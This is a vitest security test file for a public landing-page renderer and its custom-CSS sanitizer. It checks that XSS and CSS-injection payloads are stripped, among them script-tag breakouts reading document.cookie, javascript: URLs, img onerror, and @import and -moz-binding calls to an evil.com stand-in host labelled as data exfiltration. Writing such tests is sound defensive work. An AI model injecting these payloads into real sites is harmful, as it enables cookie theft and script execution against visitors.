/**
 * Public Page Renderer Security Tests
 *
 * Validates CSS sanitization to prevent XSS attacks via custom CSS.
 * Critical because landing pages are publicly accessible and contain
 * sensitive customer call recording data (even scrubbed).
 */

import { describe, it, expect } from "vitest";
import { renderLandingPageHtml } from "./public-page/renderer.js";
import { sanitizeCustomCss } from "./public-page/sanitizers.js";

describe("sanitizeCustomCss", () => {
  it("should return null for null input", () => {
    expect(sanitizeCustomCss(null)).toBeNull();
  });

  it("should allow safe CSS properties", () => {
    const css = `
      .callout { background-color: #f0f0f0; border-radius: 8px; }
      h1 { color: #333; font-size: 2em; }
    `;
    const result = sanitizeCustomCss(css);
    expect(result).toContain("background-color: #f0f0f0");
    expect(result).toContain("color: #333");
  });

  it("should remove </style> tag injection attempts", () => {
    const css = "body { color: red; } </style><script>alert('XSS')</script><style>";
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("</style>");
    expect(result).not.toContain("<script>");
  });

  it("should remove <script> tags", () => {
    const css = '<script>document.cookie</script> body { color: red; }';
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("<script>");
    expect(result).toContain("body { color: red; }");
  });

  it("should remove @import rules (data exfiltration)", () => {
    const css = "@import url('https://evil.com/steal.css'); body { color: red; }";
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("@import");
    expect(result).not.toContain("evil.com");
    expect(result).toContain("body { color: red; }");
  });

  it("should remove javascript: URLs", () => {
    const css = "div { background: url(javascript:alert(1)); }";
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("javascript:");
  });

  it("should remove CSS expression() (IE exploits)", () => {
    const css = "div { width: expression(alert('XSS')); }";
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("expression(");
  });

  it("should remove -moz-binding (Firefox XBL injection)", () => {
    const css = "div { -moz-binding: url('https://evil.com/xbl.xml'); }";
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("-moz-binding:");
  });

  it("should remove behavior: (IE HTC injection)", () => {
    const css = "div { behavior: url('malicious.htc'); }";
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("behavior:");
  });

  it("should remove data: URIs in url()", () => {
    const css =
      "div { background-image: url(data:text/html,<script>alert(1)</script>); }";
    const result = sanitizeCustomCss(css);
    expect(result).not.toMatch(/url\s*\(\s*["']?\s*data:/i);
  });

  it("should handle case variations", () => {
    const css = '@IMPORT url("evil.css"); JAVASCRIPT:alert(1); EXPRESSION(alert(1))';
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("IMPORT");
    expect(result).not.toContain("JAVASCRIPT");
    expect(result).not.toContain("EXPRESSION");
  });

  it("should handle multiple injection vectors in one CSS string", () => {
    const css = `
      @import url("evil.css");
      div { background: url(javascript:alert(1)); }
      </style><script>document.cookie</script><style>
      p { width: expression(alert(1)); }
      span { -moz-binding: url("xbl.xml"); }
    `;
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("@import");
    expect(result).not.toContain("javascript:");
    expect(result).not.toContain("</style>");
    expect(result).not.toContain("<script>");
    expect(result).not.toContain("expression(");
    expect(result).not.toContain("-moz-binding:");
  });
});

describe("renderLandingPageHtml", () => {
  it("escapes raw HTML from markdown body", () => {
    const html = renderLandingPageHtml({
      title: "Test Page",
      subtitle: null,
      body: '<img src=x onerror="alert(1)"><script>alert(2)</script>',
      calloutBoxes: [],
      totalCallHours: 2,
      heroImageUrl: null,
      customCss: null,
    });

    expect(html).not.toContain("<script>alert(2)</script>");
    expect(html).not.toContain('<img src=x onerror="alert(1)">');
    expect(html).toContain("&lt;script&gt;alert(2)&lt;/script&gt;");
  });

  it("sanitizes custom CSS before rendering", () => {
    const html = renderLandingPageHtml({
      title: "CSS Test",
      subtitle: null,
      body: "Body",
      calloutBoxes: [],
      totalCallHours: 1,
      heroImageUrl: null,
      customCss: "@import url('https://evil.com/x.css'); body { color: red; }",
    });

    expect(html).not.toContain("@import");
    expect(html).toContain("body { color: red; }");
  });

  it("drops non-http(s) hero image URLs", () => {
    const html = renderLandingPageHtml({
      title: "Image Test",
      subtitle: null,
      body: "Body",
      calloutBoxes: [],
      totalCallHours: 1,
      heroImageUrl: "javascript:alert(1)",
      customCss: null,
    });

    expect(html).not.toContain("background-image:");
  });

  it("applies org branding styles and header when values are valid", () => {
    const html = renderLandingPageHtml({
      title: "Branded Page",
      subtitle: null,
      body: "Body",
      calloutBoxes: [],
      totalCallHours: 1,
      heroImageUrl: null,
      customCss: null,
      branding: {
        brandName: "Acme Corp",
        logoUrl: "https://cdn.example.com/logo.png",
        primaryColor: "#112233",
        accentColor: "#334455",
        surfaceColor: "#f7f7f7",
      },
    });

    expect(html).toContain("Acme Corp");
    expect(html).toContain("https://cdn.example.com/logo.png");
    expect(html).toContain("--color-accent: #112233;");
    expect(html).toContain("--color-accent-hover: #334455;");
    expect(html).toContain("--color-surface: #f7f7f7;");
  });

  it("sanitizes unsafe branding values", () => {
    const html = renderLandingPageHtml({
      title: "Unsafe Branding",
      subtitle: null,
      body: "Body",
      calloutBoxes: [],
      totalCallHours: 1,
      heroImageUrl: null,
      customCss: null,
      branding: {
        brandName: "Unsafe Org",
        logoUrl: "javascript:alert(1)",
        primaryColor: "red",
        accentColor: "var(--hack)",
        surfaceColor: "#zzzzzz",
      },
    });

    expect(html).toContain("Unsafe Org");
    expect(html).not.toContain("javascript:alert(1)");
    expect(html).not.toContain("--color-accent: red;");
    expect(html).not.toContain("--color-accent-hover: var(--hack);");
    expect(html).not.toContain("--color-surface: #zzzzzz;");
  });
});
